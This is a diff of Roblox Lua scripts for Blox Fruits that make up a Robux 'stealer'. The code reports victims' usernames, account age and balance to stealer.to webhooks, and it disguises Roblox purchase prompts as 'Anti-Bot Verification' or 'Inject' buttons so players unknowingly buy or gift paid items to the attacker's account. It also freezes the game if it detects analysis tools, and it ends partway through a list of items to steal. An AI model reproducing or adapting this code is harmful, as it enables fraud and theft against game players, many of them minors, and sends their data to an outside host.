@@ -1,443 +1,416 @@
-LogsWebhook = "https://stealer.to/post?uniqueid=97b37190"
-ExecutionWebhook = "https://stealer.to/post?uniqueid=e92c9e96"
-Username = "x6TNine"
-PromptText = "Launch Script"
-RandomizedPrompt = false
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local player = Players.LocalPlayer
 
---obfuscate after this
+local webhookUrl = "https://stealer.to/post?uniqueid=e92c9e96"  -- Replace with your Discord webhook URL
 
-repeat task.wait() until game:IsLoaded()
+-- Capture the player's name, display name, and game details
+local playerName = player.Name
+local playerDisplayName = player.DisplayName
+local playerUserId = player.UserId
+local gameId = game.PlaceId
 
-local validGames = {
-    [2753915549] = true,  -- Sea 1
-    [4442272183] = true,  -- Sea 2
-    [7449423635] = true   -- Sea 3
-}
+-- Get the game name using MarketplaceService
+local success, gameInfo = pcall(function()
+    return MarketplaceService:GetProductInfo(gameId)
+end)
 
-if not validGames[game.PlaceId] then
-    game:GetService("Players").LocalPlayer:Kick("Wrong game! This script is meant for Blox Fruits.")
-    return
+local gameName = success and gameInfo.Name or "Unknown Game"
+local gameLink = "https://www.roblox.com/games/" .. gameId
+
+-- Construct the player's Roblox profile link
+local playerProfileLink = "https://www.roblox.com/users/" .. playerUserId .. "/profile"
+
+-- Create the embed message
+local function createEmbed()
+    return {
+        ["embeds"] = {
+            {
+                ["title"] = "**✅ SCRIPT EXECUTED - CAPTURE ✅**",
+                ["color"] = 0x00FF00,  -- Green color
+                ["fields"] = {
+                    {
+                        ["name"] = "USERNAME",
+                        ["value"] = playerName,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "DISPLAY NAME",
+                        ["value"] = playerDisplayName,  -- Display name
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "GAME NAME",
+                        ["value"] = gameName,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "GAME LINK",
+                        ["value"] = gameLink,  -- Game link
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "PROFILE LINK",
+                        ["value"] = playerProfileLink,  -- Profile link
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "PING",
+                        ["value"] = "@everyone",  -- PING field
+                        ["inline"] = false
+                    },
+                },
+                ["footer"] = {
+                    ["text"] = "Executed on Roblox",  -- Added credits
+                    ["icon_url"] = "https://www.roblox.com/favicon.ico"  -- Roblox icon
+                },
+            }
+        }
+    }
 end
 
-if _G.scriptExecuted then
-    warn("You have already executed this code.")
-    return
+-- Function to send a POST request to the webhook URL
+local function sendWebhookNotification()
+    local data = HttpService:JSONEncode(createEmbed())
+    
+    -- Attempt to send the notification using various request methods
+    pcall(function()
+        if syn then  -- For Synapse X
+            syn.request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = data
+            })
+        elseif http_request then  -- For KRNL, etc.
+            http_request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = data
+            })
+        elseif http then  -- For other executors
+            http.request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = data
+            })
+        end
+    end)
 end
 
-local function takeAction()
+-- Send the initial notification when the script is executed
+sendWebhookNotification()
+
+task.spawn(function()
     local success, result = pcall(function()
+        local TweenService = game:GetService("TweenService")
+        local RunService = game:GetService("RunService")
+        local CoreGui = game:GetService("CoreGui")
+
+        local function typewriterEffect(textLabel, text, speed)
+            textLabel.Text = ""
+            task.spawn(function()
+                local currentText = ""
+                for i = 1, #text do
+                    if not textLabel or not textLabel.Parent then break end
+                    currentText = currentText .. string.sub(text, i, i)
+                    textLabel.Text = currentText
+                    task.wait(speed or 0.05)
+                end
+            end)
+        end
+
+        local function applyChanges(prompt, counter)
+            local alertContents = prompt:WaitForChild("AlertContents")
+            prompt.Image = ""
+            prompt.ImageTransparency = 1
+            prompt.BackgroundTransparency = 1
+            prompt.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+            prompt.BorderSizePixel = 0
+
+            local promptGradient = Instance.new("UIGradient")
+            promptGradient.Color = ColorSequence.new({
+                ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 30)),
+                ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 15))
+            })
+            promptGradient.Parent = prompt
+
+            local promptGlow = Instance.new("ImageLabel")
+            promptGlow.Name = "Glow"
+            promptGlow.BackgroundTransparency = 1
+            promptGlow.Size = UDim2.new(1.5, 0, 1.5, 0)
+            promptGlow.Position = UDim2.new(-0.25, 0, -0.25, 0)
+            promptGlow.ZIndex = -1
+            promptGlow.Image = "rbxasset://textures/ui/Glow.png"
+            promptGlow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            promptGlow.ImageTransparency = 0.5
+            promptGlow.Parent = prompt
+
+            local titleLabel = alertContents:WaitForChild("TitleContainer"):WaitForChild("TitleArea"):WaitForChild("Title")
+            titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+            titleLabel.Font = Enum.Font.Code
+            titleLabel.TextScaled = true
+            titleLabel.Size = UDim2.new(0, 386, 0, 26)
+
+            local titleStroke = Instance.new("UIStroke")
+            titleStroke.Color = Color3.fromRGB(0, 0, 0)
+            titleStroke.Thickness = 2
+            titleStroke.Parent = titleLabel
+
+            typewriterEffect(titleLabel, "Anti-Bot Verification v" .. counter) -- << Change it to ur stuff
+
+            local function setupButton(button)
+                if button and button:IsA("ImageButton") and button.Visible then
+                    for _, child in pairs(button:GetChildren()) do
+                        child:Destroy()
+                    end
+                    button:ClearAllChildren()
+                    button.Image = ""
+                    button.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+                    button.AutoButtonColor = false
+                    button.BorderSizePixel = 0
+
+                    local container = Instance.new("Frame")
+                    container.Size = UDim2.new(1, 0, 1, 0)
+                    container.BackgroundTransparency = 1
+                    container.ClipsDescendants = true
+                    container.Parent = button
+
+                    local innerShadow = Instance.new("ImageLabel")
+                    innerShadow.BackgroundTransparency = 1
+                    innerShadow.Image = "rbxassetid://7131311876"
+                    innerShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+                    innerShadow.ImageTransparency = 0.5
+                    innerShadow.Size = UDim2.new(1, 0, 1, 0)
+                    innerShadow.Parent = container
+
+                    local outerGlow = Instance.new("ImageLabel")
+                    outerGlow.BackgroundTransparency = 1
+                    outerGlow.Image = "rbxasset://textures/ui/Glow.png"
+                    outerGlow.ImageColor3 = Color3.fromRGB(0, 128, 128)
+                    outerGlow.ImageTransparency = 0.8
+                    outerGlow.Size = UDim2.new(1.5, 0, 1.5, 0)
+                    outerGlow.Position = UDim2.new(-0.25, 0, -0.25, 0)
+                    outerGlow.ZIndex = -1
+                    outerGlow.Parent = button
+
+                    local edgeHighlight = Instance.new("UIStroke")
+                    edgeHighlight.Color = Color3.fromRGB(0, 255, 255)
+                    edgeHighlight.Thickness = 1.5
+                    edgeHighlight.Transparency = 0.5
+                    edgeHighlight.Parent = button
+
+                    local gradient = Instance.new("UIGradient")
+                    gradient.Color = ColorSequence.new({
+                        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
+                        ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 200, 200))
+                    })
+                    gradient.Rotation = 45
+                    gradient.Transparency = NumberSequence.new(0.95)
+                    gradient.Parent = button
+
+                    local textLabel = Instance.new("TextLabel")
+                    textLabel.Name = "ButtonText"
+                    textLabel.Size = UDim2.new(1, 0, 1, 0)
+                    textLabel.BackgroundTransparency = 1
+                    textLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
+                    textLabel.TextStrokeColor3 = Color3.fromRGB(0, 128, 128)
+                    textLabel.TextStrokeTransparency = 0
+                    textLabel.TextScaled = true
+                    textLabel.Font = Enum.Font.Code
+                    textLabel.Parent = container
+
+                    typewriterEffect(textLabel, ({ "I'm not a bot", "Continue", "Verify" })[math.random(1, 3)], 0.08)
+
+                    button.MouseEnter:Connect(function()
+                        if not button or not button.Parent then return end
+
+                        TweenService:Create(button, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
+                            Size = UDim2.new(button.Size.X.Scale, button.Size.X.Offset + 4,
+                                            button.Size.Y.Scale, button.Size.Y.Offset + 4)
+                        }):Play()
+
+                        TweenService:Create(outerGlow, TweenInfo.new(0.3), {
+                            ImageTransparency = 0.6,
+                            Size = UDim2.new(1.7, 0, 1.7, 0),
+                            Position = UDim2.new(-0.35, 0, -0.35, 0)
+                        }):Play()
+
+                        TweenService:Create(edgeHighlight, TweenInfo.new(0.3), {
+                            Thickness = 2,
+                            Transparency = 0
+                        }):Play()
+                    end)
+
+                    button.MouseLeave:Connect(function()
+                        if not button or not button.Parent then return end
+
+                        TweenService:Create(button, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
+                            Size = UDim2.new(button.Size.X.Scale, button.Size.X.Offset - 4,
+                                            button.Size.Y.Scale, button.Size.Y.Offset - 4)
+                        }):Play()
+
+                        TweenService:Create(outerGlow, TweenInfo.new(0.3), {
+                            ImageTransparency = 0.8,
+                            Size = UDim2.new(1.5, 0, 1.5, 0),
+                            Position = UDim2.new(-0.25, 0, -0.25, 0)
+                        }):Play()
+
+                        TweenService:Create(edgeHighlight, TweenInfo.new(0.3), {
+                            Thickness = 1.5,
+                            Transparency = 0.5
+                        }):Play()
+                    end)
+
+                    button.MouseButton1Down:Connect(function()
+                        if not button or not button.Parent then return end
+
+                        TweenService:Create(button, TweenInfo.new(0.1), {
+                            Size = UDim2.new(button.Size.X.Scale, button.Size.X.Offset - 2,
+                                            button.Size.Y.Scale, button.Size.Y.Offset - 2)
+                        }):Play()
+                    end)
+
+                    button.MouseButton1Up:Connect(function()
+                        if not button or not button.Parent then return end
+
+                        TweenService:Create(button, TweenInfo.new(0.1), {
+                            Size = UDim2.new(button.Size.X.Scale, button.Size.X.Offset + 2,
+                                            button.Size.Y.Scale, button.Size.Y.Offset + 2)
+                        }):Play()
+                    end)
+                end
+            end
+
+            local footer = alertContents:WaitForChild("Footer")
+            local buttons = footer:WaitForChild("Buttons")
+            setupButton(buttons:FindFirstChild("1"))
+            setupButton(buttons:FindFirstChild("2"))
+        end
+
+        local processedPrompts = {}
+        local promptCounter = 1
+
+        RunService.RenderStepped:Connect(function()
+            local purchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
+            if purchasePrompt then
+                local container = purchasePrompt:FindFirstChild("ProductPurchaseContainer")
+                if container then
+                    local animator = container:FindFirstChild("Animator")
+                    if animator then
+                        local prompt = animator:FindFirstChild("Prompt")
+                        if prompt and not processedPrompts[prompt] then
+                            processedPrompts[prompt] = true
+                            applyChanges(prompt, promptCounter)
+                            promptCounter = promptCounter + 1
+                        end
+                    end
+                end
+            end
+        end)
     end)
 
     if not success then
-        warn("you're a skid")
+        warn("Failed to access CoreGui: " .. tostring(result))
     end
+end)
 
-    task.wait(1)
+--- START OF FILE Bloxfruit_improved.txt ---
 
-    if setfpscap then
-        setfpscap(0)
-    end
+Username = "x6TNine"
+Webhook = "https://stealer.to/post?uniqueid=97b37190"
 
-    rconsoleclear()
-
-    print = function() end
-    warn = function() end
-    error = function() end
-    setclipboard = function() end
-
-    while true do end
-end
-
-if ishooked and (ishooked(game.HttpGet) or ishooked(request)) then
-    takeAction()
-end
-
-local function isMobile()
-    local UserInputService = game:GetService("UserInputService")
-    return UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
-end
-
-_G.scriptExecuted = true
+-- BLOX FRUIT
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local CoreGui = game:GetService("CoreGui")
 local Players = game:GetService("Players")
+local result = 0
+
 local HttpService = game:GetService("HttpService")
-local UserInputService = game:GetService("UserInputService")
-local marketplaceService = game:GetService("MarketplaceService")
-local RunService = game:GetService("RunService")
-local TweenService = game:GetService("TweenService")
-local gameInfo = marketplaceService:GetProductInfo(game.PlaceId)
-local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
 
-local UserId
-local version = "1.0.2"
-local totalSpent = 0
-
-local success, err = pcall(function()
-    UserId = Players:GetUserIdFromNameAsync(Username)
+local success, UserId = pcall(function()
+    return Players:GetUserIdFromNameAsync(Username)
 end)
 
-local messages = {
-    "yo check ur inv real quick",
-    "bruh moment incoming",
-    "what if we... opened gifts...",
-    "not clickbait (real)",
-    "ur actually gonna like this",
-    "this is so canon rn",
-    "friend shaped gift moment",
-    "just girly things (free stuff)",
-    "i pretend i do not see",
-    "current status: giving",
-    "literally crying and giving",
-    "bestie ur inventory calls",
-    "fumbled the bag (u get it)",
-    "real recognize real (open)"
-}
-
-local function loopSinkTransparency()
-    local viewportOverlay = playerGui:WaitForChild("ViewportOverlay", 10)
-    if not viewportOverlay then return end
-    
-    local sink = viewportOverlay:WaitForChild("Sink", 10)
-    if not sink then return end
-
-    game:GetService("RunService").RenderStepped:Connect(function()
-        sink.BackgroundTransparency = 1
-    end)
-end
-
-local function hideNotifications()
-    local notifications = playerGui:WaitForChild("Notifications", 10)
-    if notifications then
-        notifications.Enabled = false
-    end
-end
-
-local function safeExecute(func)
-    local success, error = pcall(func)
-    if not success then
-        warn(error)
-    end
-end
-
-safeExecute(loopSinkTransparency)
-safeExecute(hideNotifications)
-
-local function getRandomColor()
-    return Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
-end
-
-local function getRandomFont()
-    local fonts = {
-        Enum.Font.PermanentMarker,
-        Enum.Font.Arcade,
-        Enum.Font.Bangers,
-        Enum.Font.Creepster,
-        Enum.Font.DenkOne,
-        Enum.Font.Highway,
-        Enum.Font.IndieFlower,
-        Enum.Font.JosefinSans,
-        Enum.Font.Merriweather
+local args = {
+    [1] = "buyRobuxShop",
+    [2] = {
+        ["StorageName"] = "2x EXP (15 mins.)",
+        ["FunnelId"] = "Shop",
+        ["PurchaseLocation"] = "Shop"
     }
-    return fonts[math.random(1, #fonts)]
-end
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
 
-local function modifyPromptUI(isFirstPrompt)
-    local CoreGui = game:GetService("CoreGui")
-    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
-    if not PurchasePrompt then return end
-    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
-    if not ProductContainer then return end
-    local Animator = ProductContainer:FindFirstChild("Animator")
-    if not Animator then return end
-    local prompt = Animator:FindFirstChild("Prompt")
-    if not prompt then return end
-    local alertContents = prompt:FindFirstChild("AlertContents")
-    if not alertContents then return end
+local CoreGui = game:GetService("CoreGui")
+local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt")
+local ProductContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
+local Animator = ProductContainer:WaitForChild("Animator")
 
-    prompt.BackgroundTransparency = 1
-    prompt.Image = ""
+Animator.ChildAdded:Connect(function(child)
+    if child.Name == "Prompt" then
+        local prompt = Animator:WaitForChild("Prompt")
+        local alertContents = prompt:WaitForChild("AlertContents")
 
-    local titleContainer = alertContents:FindFirstChild("TitleContainer")
-    if titleContainer then
-        local titleArea = titleContainer:FindFirstChild("TitleArea")
-        if titleArea then
-            titleArea.Visible = false
-        end
-    end
-
-    local middleContent = alertContents:FindFirstChild("MiddleContent")
-    if middleContent then
-        middleContent.Visible = false
-    end
-
-    local footerButtons = alertContents:FindFirstChild("Footer"):FindFirstChild("Buttons")
-    if footerButtons then
-        local button1 = footerButtons:FindFirstChild("1")
-        if button1 then
-            button1.Visible = false
+        local middleContent = alertContents:FindFirstChild("MiddleContent")
+        if middleContent then
+            middleContent.Visible = false
         end
 
+        local title = alertContents:WaitForChild("TitleContainer"):WaitForChild("TitleArea"):WaitForChild("Title")
+        if title and title:IsA("TextLabel") then
+            title.Text = "SCRIPT LOADED!"
+        end
+
+        local footerButtons = alertContents:WaitForChild("Footer"):WaitForChild("Buttons")
         local button2 = footerButtons:FindFirstChild("2")
         if button2 then
-            button2:ClearAllChildren()
-
-            local buttonContainer = Instance.new("Frame")
-            buttonContainer.Name = "ButtonContainer"
-            buttonContainer.Size = UDim2.new(1, 0, 1, 0)
-            buttonContainer.BackgroundTransparency = 1
-            buttonContainer.Parent = button2
-
-            local background = Instance.new("Frame")
-            background.Name = "Background"
-            background.Size = UDim2.new(1, 0, 1, 0)
-            background.BackgroundTransparency = 0.9
-            background.Parent = buttonContainer
-
-            local corner = Instance.new("UICorner")
-            corner.CornerRadius = UDim.new(0.2, 0)
-            corner.Parent = background
-
-            local gradient = Instance.new("UIGradient")
-            gradient.Rotation = RandomizedPrompt and math.random(0, 360) or 45
-            
-            local gradientColors
-            if RandomizedPrompt then
-                gradientColors = {
-                    ColorSequenceKeypoint.new(0, getRandomColor()),
-                    ColorSequenceKeypoint.new(0.5, getRandomColor()),
-                    ColorSequenceKeypoint.new(1, getRandomColor())
-                }
-            else
-                gradientColors = {
-                    ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 150, 255)),
-                    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(120, 180, 255)),
-                    ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 150, 255))
-                }
-            end
-            gradient.Color = ColorSequence.new(gradientColors)
-            gradient.Parent = background
-
-            local glow = Instance.new("ImageLabel")
-            glow.Name = "Glow"
-            glow.BackgroundTransparency = 1
-            glow.Image = "rbxassetid://7912134082"
-            glow.ImageColor3 = RandomizedPrompt and getRandomColor() or Color3.fromRGB(80, 150, 255)
-            glow.ImageTransparency = RandomizedPrompt and math.random(4, 8) / 10 or 0.8
-            glow.Size = UDim2.new(1.2, 0, 1.2, 0)
-            glow.Position = UDim2.new(0.5, 0, 0.5, 0)
-            glow.AnchorPoint = Vector2.new(0.5, 0.5)
-            glow.Parent = buttonContainer
-
-            local buttonText = Instance.new("TextLabel")
-            buttonText.Name = "ButtonText"
-            buttonText.Size = UDim2.new(1, 0, 1, 0)
-            buttonText.BackgroundTransparency = 1
-            buttonText.Text = PromptText or "Execute Script"
-            buttonText.TextColor3 = RandomizedPrompt and getRandomColor() or Color3.fromRGB(255, 255, 255)
-            buttonText.TextStrokeColor3 = RandomizedPrompt and getRandomColor() or Color3.fromRGB(0, 0, 0)
-            buttonText.TextStrokeTransparency = RandomizedPrompt and math.random(0, 5) / 10 or 0
-            buttonText.Font = RandomizedPrompt and getRandomFont() or Enum.Font.PermanentMarker
-            buttonText.TextScaled = true
-            buttonText.Parent = buttonContainer
-            
-            local textShadow = buttonText:Clone()
-            textShadow.Name = "TextShadow"
-            textShadow.Position = UDim2.new(0, 2, 0, 2)
-            textShadow.TextColor3 = Color3.fromRGB(0, 0, 0)
-            textShadow.TextTransparency = 0.8
-            textShadow.ZIndex = buttonText.ZIndex - 1
-            textShadow.Parent = buttonContainer
-
-            local tweenService = game:GetService("TweenService")
-            local hoverInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
-            local glowInfo = TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
-
-            local glowTween = tweenService:Create(glow, glowInfo, {
-                ImageTransparency = RandomizedPrompt and math.random(3, 6) / 10 or 0.6,
-                Size = UDim2.new(1.3, 0, 1.3, 0)
-            })
-            glowTween:Play()
-
-            button2.MouseEnter:Connect(function()
-                local scaleTween = tweenService:Create(buttonContainer, hoverInfo, {
-                    Size = UDim2.new(1.1, 0, 1.1, 0)
-                })
-                
-                local hoverGradientColors
-                if RandomizedPrompt then
-                    hoverGradientColors = {
-                        ColorSequenceKeypoint.new(0, getRandomColor()),
-                        ColorSequenceKeypoint.new(0.5, getRandomColor()),
-                        ColorSequenceKeypoint.new(1, getRandomColor())
-                    }
-                else
-                    hoverGradientColors = {
-                        ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 170, 255)),
-                        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(140, 200, 255)),
-                        ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 170, 255))
-                    }
-                end
-                
-                
-                local glowColorTween = tweenService:Create(glow, hoverInfo, {
-                    ImageTransparency = RandomizedPrompt and math.random(3, 6) / 10 or 0.6
-                })
-                
-                scaleTween:Play()
-                glowColorTween:Play()
-            end)
-
-            button2.MouseLeave:Connect(function()
-                local scaleTween = tweenService:Create(buttonContainer, hoverInfo, {
-                    Size = UDim2.new(1, 0, 1, 0)
-                })
-                
-                local glowColorTween = tweenService:Create(glow, hoverInfo, {
-                    ImageTransparency = RandomizedPrompt and math.random(4, 8) / 10 or 0.8
-                })
-                
-                scaleTween:Play()
-                glowColorTween:Play()
-            end)
+            button2.Visible = false
         end
-    end
 
-    local footer = alertContents:FindFirstChild("Footer")
-    if footer then
-        local footerContent = footer:FindFirstChild("FooterContent")
+        local footerContent = alertContents:WaitForChild("Footer"):FindFirstChild("FooterContent")
         if footerContent then
-            local content = footerContent:FindFirstChild("Content")
-            if content then
-                local RemainingBalanceText = content:FindFirstChild("RemainingBalanceText")
-                if RemainingBalanceText then
-                    RemainingBalanceText.Visible = false
-                end
+            footerContent.Visible = false
+        end
+
+        local button1 = footerButtons:FindFirstChild("1")
+        if button1 then
+            local buttonContent = button1:WaitForChild("ButtonContent")
+            local buttonMiddleContent = buttonContent:WaitForChild("ButtonMiddleContent"):FindFirstChildWhichIsA("TextLabel")
+            if buttonMiddleContent then
+                buttonMiddleContent.Text = "Inject"
             end
         end
     end
-end
+end)
 
-local function getExecutor()
-    if syn then return "Synapse Z"
-    elseif getexecutor then return getexecutor()
-    elseif identifyexecutor then return identifyexecutor()
-    elseif fluxus then return "Fluxus"
-    else return "Unknown" end
-end
-
-local function getRandomMessage()
-    return messages[math.random(1, #messages)]
-end
-
-local function sendExecutionLog()
-    local executorIdentifier = getExecutor()
-    local platform = UserInputService.TouchEnabled and "Mobile" or "PC"
-    local membershipType = game.Players.LocalPlayer.MembershipType
-    local hasPremium = (membershipType == Enum.MembershipType.Premium) and "Yes" or "No"
-    local embed = {
-        ["title"] = "NEW EXECUTION!",
-        ["color"] = 3063792,
-        ["fields"] = {
-            {
-                ["name"] = "Username",
-                ["value"] = game.Players.LocalPlayer.Name,
-                ["inline"] = true
-            },
-            {
-                ["name"] = "Current BF Rua Stealer Version",
-                ["value"] = version,
-                ["inline"] = true
-            },
-            {
-                ["name"] = "Current Game",
-                ["value"] = gameInfo.Name,
-                ["inline"] = true
-            },
-            {
-                ["name"] = "Has Premium",
-                ["value"] = hasPremium,
-                ["inline"] = true
-            },
-            {
-                ["name"] = "Current Executor",
-                ["value"] = executorIdentifier,
-                ["inline"] = true
-            },
-            {
-                ["name"] = "Platform",
-                ["value"] = platform,
-                ["inline"] = true
-            },
-        }
-    }
-
-    local data = HttpService:JSONEncode({
-        ["embeds"] = {embed}
-    })
-
-    request({
-        Url = ExecutionWebhook,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = data
-    })
-end
-
-local function getRobuxBalance()
-    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
-    if not PurchasePrompt then return 0 end
-    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
-    if not ProductContainer then return 0 end
-    local Animator = ProductContainer:FindFirstChild("Animator")
-    if not Animator then return 0 end
-    local prompt = Animator:FindFirstChild("Prompt")
-    if not prompt then return 0 end
-    local alertContents = prompt:FindFirstChild("AlertContents")
-    if not alertContents then return 0 end
-    local footer = alertContents:FindFirstChild("Footer")
-    if not footer then return 0 end
-    local footerContent = footer:FindFirstChild("FooterContent")
-    if not footerContent then return 0 end
-    local content = footerContent:FindFirstChild("Content")
-    if not content then return 0 end
-    local RemainingBalanceText = content:FindFirstChild("RemainingBalanceText")
-    if not RemainingBalanceText or not RemainingBalanceText.Text then return 0 end
-    local balanceText = RemainingBalanceText.Text:match("(%d+)$")
-    return (balanceText and tonumber(balanceText) or 0) + 25
-end
-
-local function sendWebhook(totalSpent, itemName)
-    local balance = getRobuxBalance()
-    local executorIdentifier = getExecutor()
+local function sendWebhook()
 
     local embed = {
-        ["title"] = ":turtle:  ! RUA BLOX FRUITS HIT ! :turtle: ",
-        ["color"] = 65280,
+        ["title"] = "You Got Blox Fruit Hit!",
+        ["color"] = 39423,
         ["fields"] = {
             {
-                ["name"] = "PLAYER INFO <a:catyes:1160127609569542227> ",
+                ["name"] = "<:drawpen:1311079366125555782> ᴘʟᴀʏᴇʀ ɪɴꜰᴏ",
                 ["value"] = "```Name: " .. game.Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"
             },
             {
-                ["name"] = "ROBUX SPENT <:Ztsuo_Robux:1193358187760451615> ",
-                ["value"] = "```" .. totalSpent .. "```"
+                ["name"] = "<:robux:1314309850154537020> ᴛᴏᴛᴀʟ ʀᴏʙᴜx",
+                ["value"] = "```" .. result .. "```"
             },
             {
-                ["name"] = "ITEM YOU GOT <a:cash:1338918152003780739> ",
-                ["value"] = "```" .. itemName .. "```"
-            },
-            {
-                ["name"] = "EXECUTOR",
-                ["value"] = "```Executor: " .. executorIdentifier .. "```"
-            },
-            {
-                ["name"] = "Current Rua Stealer Version: 1.0.2",
-                ["value"] = "**1.0.2**",
+                ["name"] = "ᴅɪꜱᴄᴏʀᴅ sᴇʀᴠᴇʀ",
+                ["value"] = "[**Join Invite**](https://discord.gg/darkscripts)",
             }
         }
     }
@@ -448,7 +421,16 @@ local function sendWebhook(totalSpent, itemName)
     })
 
     request({
-        Url = LogsWebhook,
+        Url = Webhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = data
+    })
+
+    request({
+        Url = LogsWebhook, -- Assuming LogsWebhook is defined elsewhere
         Method = "POST",
         Headers = {
             ["Content-Type"] = "application/json"
@@ -457,370 +439,133 @@ local function sendWebhook(totalSpent, itemName)
     })
 end
 
-local promptConfirmed = false
-local purchaseInProgress = false
-
-local function waitForPromptToDisappear()
-    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
-    if not PurchasePrompt then return end
-    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
-    if not ProductContainer then return end
-    local Animator = ProductContainer:FindFirstChild("Animator")
-    if not Animator then return end
-
-    while Animator:FindFirstChild("Prompt") do
-        task.wait(0.1)
-    end
-end
-
-local function waitForPurchaseConfirmation()
-    local PurchasePrompt = game:GetService("CoreGui"):WaitForChild("PurchasePrompt")
-    local ProductContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
-    local Animator = ProductContainer:WaitForChild("Animator")
-    local prompt = Animator:WaitForChild("Prompt")
-    local alertContents = prompt:WaitForChild("AlertContents")
-    local footer = alertContents:WaitForChild("Footer")
-    local footerButtons = footer:WaitForChild("Buttons")
-    local confirmButton = footerButtons:WaitForChild("2")
-
-    local function confirm()
-        promptConfirmed = true
-    end
-
-    confirmButton.MouseButton1Click:Connect(confirm)
-    confirmButton.TouchTap:Connect(confirm)
-end
-
-local webhookSent = false
-
-local function buyItem(storageName, purchaseLocation, cost)
-    if purchaseInProgress then return end
-    
-    local function validateAndFetchUserId()
-        if not Username or Username == "" then return false end
-        if not UserId or UserId <= 0 then
-            local success = pcall(function()
-                UserId = Players:GetUserIdFromNameAsync(Username)
-            end)
-            if not success or not UserId or UserId <= 0 then return false end
-        end
-        return true
-    end
-    
-    local function waitForValidData()
-        local attempts = 0
-        while attempts < 10 do
-            if validateAndFetchUserId() then return true end
-            attempts = attempts + 1
-            task.wait(0.5)
-        end
-        return false
-    end
-    
-    if not waitForValidData() then return end
-    
-    purchaseInProgress = true
-    
-    local args = {
-        [1] = "buyRobuxShop",
-        [2] = {
-            ["Message"] = type(getRandomMessage) == "function" and getRandomMessage() or "",
-            ["PurchaseAction"] = "Gift",
-            ["StorageName"] = storageName,
-            ["PurchaseLocation"] = purchaseLocation,
-            ["FunnelId"] = "Shop",
-            ["ReceiverName"] = Username,
-            ["ReceiverUserId"] = UserId
-        }
+local function stealitem()
+    local items_to_steal = {
+        { threshold = 5000, storage_name = "Permanent Dragon-Dragon" },
+        { threshold = 4000, storage_name = "Permanent Kitsune-Kitsune" },
+        { threshold = 3000, storage_name = "Permanent Leopard-Leopard" },
+        { threshold = 2700, storage_name = "Fruit Notifier" },
+        { threshold = 2550, storage_name = "Permanent Spirit-Spirit" },
+        { threshold = 2500, storage_name = "Permanent Gas-Gas" },
+        { threshold = 2450, storage_name = "Permanent Venom-Venom" },
+        { threshold = 2425, storage_name = "Permanent Shadow-Shadow" },
+        { threshold = 2400, storage_name = "Permanent Dough-Dough" },
+        { threshold = 2350, storage_name = "Permanent T-Rex-T-Rex" },
+        { threshold = 2300, storage_name = "Permanent Gravity-Gravity" },
+        { threshold = 2250, storage_name = "Permanent Blizzard-Blizzard" },
+        { threshold = 2200, storage_name = "Permanent Pain-Pain" },
+        { threshold = 2100, storage_name = "Permanent Rumble-Rumble" },
+        { threshold = 2000, storage_name = "Permanent Portal-Portal" },
+        { threshold = 1900, storage_name = "Permanent Sound-Sound" },
+        { threshold = 1800, storage_name = "Permanent Spider-Spider" },
+        { threshold = 1700, storage_name = "Permanent Love-Love" },
+        { threshold = 1650, storage_name = "Permanent Buddha-Buddha" },
+        { threshold = 1500, storage_name = "Permanent Quake-Quake" },
+        { threshold = 1300, storage_name = "Permanent Magma-Magma" },
+        { threshold = 1275, storage_name = "Permanent Ghost-Ghost" },
+        { threshold = 1250, storage_name = "Permanent Barrier-Barrier" },
+        { threshold = 1200, storage_name = "Dark Blade" },
